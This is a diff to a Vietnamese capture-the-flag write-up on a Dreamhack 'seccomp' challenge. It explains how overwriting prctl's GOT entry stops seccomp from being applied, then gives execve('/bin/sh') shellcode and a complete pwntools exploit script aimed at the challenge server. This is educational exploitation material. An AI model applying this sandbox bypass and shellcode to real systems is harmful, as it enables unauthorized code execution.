@@ -1,4 +1,4 @@
-# Lớp bảo vệ Seccomp
+<img width="862" height="282" alt="image" src="https://github.com/user-attachments/assets/c5b5131c-1941-4348-9343-ef2c5b158328" /># Lớp bảo vệ Seccomp
 [*Video anh Trí - Lớp bảo vệ Seccomp*](https://www.youtube.com/watch?v=nrKNHrEouUU&list=PLEvZsp0uc3SFuVi6TtcahxqsEbV29lXAM&index=26)
 
 
@@ -55,13 +55,58 @@ Người dùng thông thường có thể lợi dụng *seccomp* để leo quy�
 
 Chỉ khi đã chạy lệnh `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` (tắt khả năng leo quyền của chương trình) thì *seccomp* mới được phép chạy.
 
-=> Ý tưởng ở đây là vô hiệu hóa hàm `prctl` bằng cách ghi đè
+=> Ý tưởng ở đây là vô hiệu hóa hàm `prctl` bằng cách ghi đè vào địa chỉ GOT của `prctl` bằng hàm khác. Khi đó, các lần chương trình gọi `prctl` sau sẽ không tắt khả năng leo quyền của chương trình. Dẫn đến *seccomp* cũng bị từ chối thực thi.
 
+<img width="862" height="282" alt="Screenshot 2026-11-09 003848" src="https://github.com/user-attachments/assets/30eeb79d-8ee0-4b77-8f1b-0b0ff41cafa4" />
 
+Ghi đè địa chỉ `prctl`:
 
+    p.sendlineafter(b'> ',b'3')
+    p.sendlineafter(b'addr: ',str(0x602058).encode())
+    p.sendlineafter(b'value: ',str(0x40090e).encode())
 
+Khi đã vô hiệu hóa *seccomp* thì nhập shellcode gọi `execve('/bin/sh')`:
 
+    shellcode=asm('''
+        mov rax, 59
+        mov rdi, 29400045130965551
+        push rdi
+        mov rdi, rsp
+        xor rsi, rsi
+        xor rdx, rdx
+        syscall
+        '''
+    )
+    
+    p.sendlineafter(b'> ',b'1')
+    p.sendlineafter(b'shellcode: ',shellcode)
+    p.sendlineafter(b'> ',b'2')
 
+## Scipt Python
 
-
-
+    #!/usr/bin/env python3
+    from pwn import *
+    context.binary=exe=ELF('./seccomp',checksec=False)
+    
+    p=remote('host3.dreamhack.games',11304)
+    
+    p.sendlineafter(b'> ',b'3')
+    p.sendlineafter(b'addr: ',str(0x602058).encode())
+    p.sendlineafter(b'value: ',str(0x40090e).encode())
+    
+    shellcode=asm('''
+        mov rax, 59
+        mov rdi, 29400045130965551
+        push rdi
+        mov rdi, rsp
+        xor rsi, rsi
+        xor rdx, rdx
+        syscall
+        '''
+    )
+    
+    p.sendlineafter(b'> ',b'1')
+    p.sendlineafter(b'shellcode: ',shellcode)
+    p.sendlineafter(b'> ',b'2')
+    
+    p.interactive()
